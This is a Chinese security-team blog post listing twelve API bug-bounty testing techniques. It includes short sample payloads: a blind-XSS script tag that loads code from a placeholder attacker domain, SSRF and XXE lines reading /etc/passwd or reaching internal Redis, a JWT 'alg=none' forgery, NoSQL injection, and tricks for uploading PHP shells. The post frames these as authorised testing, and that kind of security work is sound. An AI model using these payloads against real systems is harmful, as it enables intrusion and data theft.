#  这12个API漏洞赏金技巧，你一定要在目标上试试！   
原创 千里  东方隐侠安全团队   2025-06-01 15:01  
  
网安知识分享  
  
DFYX’s KNOWLEDGE & NEWS  
  
  科普知识 一起成长    
  
东方隐侠·悟剑堂  
  
引言  
  
  
数字化时代，  
API（应用程序编程接口）已成为企业数据交互的核心枢纽。  
  
然而，  
API暴露的攻击面正日益成为黑客攻击的主要目标。漏洞赏金计划（Bug Bounty Program）作为企业与安全研究人员之间的桥梁，为识别API安全漏洞提供了有效途径。  
  
本文结合实战经验，讲解  
12种针对API的渗透思路，涵盖技术原理、操作流程及工具应用，旨在帮助少侠们提升漏洞挖掘效率，为企业构建API安全防护体系提供参考。  
  
十二种API测试技巧深度解析  
  
  
### 一、信息收集：扩大攻击面的 “侦察兵”  
  
1. 遗留 API 端点探测：旧版本的 “致命伤”  
  
许多企业升级 API 时会保留旧版本端点（如/api/v1），但未删除权限校验。实战操作：  
- 将请求路径中的/api/v2替换为/api/v1或直接删除版本号（/api）；  
  
- 对子域名如api-v2.example.com，尝试访问api-v1.example.com或根域名api.example.com。  
  
工具推荐：Dirbuster 扫描隐藏目录，快速定位存活端点。  
  
2. 端点发现：从公开信息中 “淘宝”  
- GitHub 侦察：用site:github.com "api.example.com"搜索硬编码的 API 密钥或配置文件；  
  
- JS 文件分析：通过浏览器开发者工具提取 JS 文件，解析隐藏的 API 路径（如fetch('/api/v3/user')）；  
  
- Swagger 文档枚举：直接访问/swagger.json或/api-docs，获取接口定义和参数说明。  
  
二、漏洞利用：直击 API 薄弱环节  
  
3. 盲打 XSS：隐藏在日志中的 “暗箭”  
  
原理：恶意脚本注入请求头（如 Referrer、User-Agent），存储在服务器日志中，待管理员查看时触发。  
  
Burp 实操：  
- 在 “Match and Replace” 规则中设置正则匹配，自动替换请求头为盲打 Payload（如<script src="https://your-domain.com/xss.js"></script>）；  
  
- 配置 Burp Collaborator 监听回调，捕获漏洞响应。  
  
4. SSRF：让服务器 “替你打工”  
  
场景：当 API 接收 URL 参数（如image_url）时，替换为你的 VPS 地址（如http://your-vps.com/canary），探测内网服务或窃取敏感数据。  
  
进阶操作：尝试file:///etc/passwd读取本地文件，或gopher://127.0.0.1:6379攻击内网 Redis。  
  
5. CSRF：冒用身份的 “钓鱼术”  
  
绕过技巧：  
- 删除请求中的 CSRF 令牌，或替换为同长度随机字符串；  
  
- 修改请求头Content-Type为application/x-www-form-urlencoded，绕过部分框架校验；  
  
- 将PUT/DELETE请求改为POST，突破方法限制。  
  
6. JWT 令牌篡改：权限提升的 “钥匙”  
  
步骤：  
- 用jwt.io解析令牌，检查alg字段是否为none或弱加密算法（如 HS256）；  
  
- 若alg=none，直接删除签名，修改payload中的用户角色（如"role": "admin"）；  
  
- 使用篡改后的令牌访问高权限接口（如/api/admin/settings）。  
  
三、访问控制与协议漏洞：突破防护的 “非常规手段”  
  
7. 绕过 401/403：特殊字符的 “魔法”  
- 嵌套路径：若/admin返回 403，尝试/admin/system-logs或/admin/..；  
  
- 字符注入：在 URL 中添加空格（/admin%20）、空字节（/admin%00）或 CRLF（/admin%0D%0A）绕过过滤；  
  
- IP 欺骗：通过X-Forwarded-For: 127.0.0.1伪造可信来源。  
  
8. CORS 配置错误：跨域窃取数据的 “通道”  
  
检测方法：  
- 查看响应头是否包含Access-Control-Allow-Origin: *且Access-Control-Allow-Credentials: true；  
  
- 构造 HTML 页面，用fetch()发起跨域请求，若返回 API 密钥等敏感数据，则存在漏洞。  
  
9. 竞争条件：并发请求的 “时间差攻击”  
  
目标场景：文件上传、订单支付、权限审批等涉及状态变更的操作。  
  
工具：Burp Intruder 设置多线程并发请求，监控是否出现订单重复创建或余额异常变动。  
  
  
四、协议与文件漏洞：冷门但致命的 “杀招”  
  
10. XXE 注入：从 JSON 到 XML 的 “格式陷阱”  
  
操作：将请求头Content-Type从application/json改为application/xml，注入外部实体：  
  
```
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
```  
  
  
若响应包含文件内容，证明存在漏洞。  
  
11. NoSQL 注入：文档型数据库的 “语法漏洞”  
  
Payload 示例：  
  
```
{ "username": { "$gt": "" } } // 匹配所有非空用户名  
```  
```
{ "username": { "$where": "this.password.indexOf('a') !== -1" } } // 布尔盲注检测密码是否含“a”
```  
  
  
12. 文件上传绕过：扩展名与魔法字节的 “伪装术”  
- 扩展名欺骗：用.phtml、.phar替代.php，或添加空字节（shell.php%00.png）；  
  
- 魔法字节攻击：在文件头部写入合法格式头（如 PNG 的89 50 4E 47），同时嵌入 PHP 代码。  
  
  
  
总结  
  
  
本文系统性地阐述了12种API漏洞赏金测试技巧，覆盖从信息收集到漏洞利用的全流程。少侠们在实践中需注意以下要点：  
- 合法合规：始终在漏洞赏金计划允许的范围内进行测试，避免触犯法律。  
  
- 工具链整合：结合Burp Suite、Postman、Python脚本等工具实现自动化测试，提升效率。  
  
- 深度分析：不仅关注漏洞存在性，更要挖掘漏洞的潜在影响（如数据泄露范围、权限提升路径），提高漏洞报告的价值。  
  
- 持续学习：跟踪API安全领域的最新趋势（如GraphQL漏洞、API网关安全），不断更新测试方法论。  
  
随着API架构的复杂化，安全威胁也在持续演进。唯有将技术原理与实战经验相结合，才能在漏洞赏金领域中高效发现关键漏洞，为企业API安全防护提供有力支撑。  
  
  
（完整内容，请查看原文链接，欢迎少侠们关注与注册东方隐侠官方网站“隐侠安全客栈”）  
  
关注东方隐侠安全团队 一起打造网安江湖  
  
        
  东方隐侠安全团队，一支专业的网络安全团队，将持续为您分享红蓝对抗、病毒研究、安全运营、应急响应等网络安全知识，提供一流网络安全服务，敬请关注！  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/icqGYtiaRQqH7zgibKsqKmX3H4AatvwPeXFsrHGpp0RsxLJpzgd0cyiaPH2HDnfv4GMdxf0lkGjAibiaBtFcLmnm2ZkA/640?wx_fmt=png "")  
  
  
  
  
公众号｜东方隐侠安全团队  
  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/icqGYtiaRQqH4laNHWaR5yOd2VbInJbO4h3daHtdT7pcSk7zONRMDyl2cht3U4dbbyiaLmMA5DpBBlTgspa3agKyw/640?wx_fmt=png "")  
  
  
  
  
请添加团队微信号  
｜东方隐侠安全团队  
  
用于拉少侠们进团队交流群  
  
